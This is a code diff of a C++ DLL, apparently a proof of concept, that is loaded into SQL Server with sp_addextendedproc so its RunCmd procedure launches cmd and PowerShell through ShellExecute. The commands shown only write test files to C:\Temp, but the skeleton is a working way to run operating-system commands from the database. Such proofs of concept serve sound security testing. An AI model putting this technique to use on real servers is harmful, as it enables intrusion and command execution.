@@ -6,11 +6,12 @@
 // sp_addextendedproc 'RunCmd', 'c:\Temp\evil64.dll';
 // RunCmd
 //DllMain.cpp
+
 #include "stdafx.h"			// dllmain.cpp : Defines the entry point for the DLL application.
-#include "srv.h"			  //Must get from C:\Program Files (x86)\Microsoft SQL Server\80\Tools\DevTools\Include            
-#include "shellapi.h"		//need for ShellExecute          
-#include "string"			  //needed for std:string         
-#include <sys/stat.h>		//need for stat in fileExists function below  
+#include "srv.h"			//Must get from C:\Program Files (x86)\Microsoft SQL Server\80\Tools\DevTools\Include            
+#include "shellapi.h"			//need for ShellExecute          
+#include "string"			//needed for std:string         
+#include <sys/stat.h>			//need for stat in fileExists function below  
 
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
@@ -32,7 +33,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 
 DLL_FUNC int __stdcall RunCmd() {
 	
-	//ShellExecute(NULL, TEXT("open"), TEXT("C:\\Temp\\execute.bat"), NULL, NULL, SW_SHOWNORMAL);
-	ShellExecute(NULL, TEXT("open"), TEXT("cmd"), TEXT(" /C echo hello > c:\\Temp\\evil.txt"), TEXT(" C:\ "), SW_SHOW);
+	ShellExecute(NULL, TEXT("open"), TEXT("cmd"), TEXT(" /C echo hello > c:\\Temp\\evil1_cmd.txt"), TEXT(" C:\\ "), SW_SHOW);
+	ShellExecute(NULL, TEXT("open"), TEXT("powershell"), TEXT(" -C \" 'test'|out-file c:\\temp\\evil2_ps.txt \" "), TEXT(" C:\\ "), SW_SHOW);
 	return 0;
 }
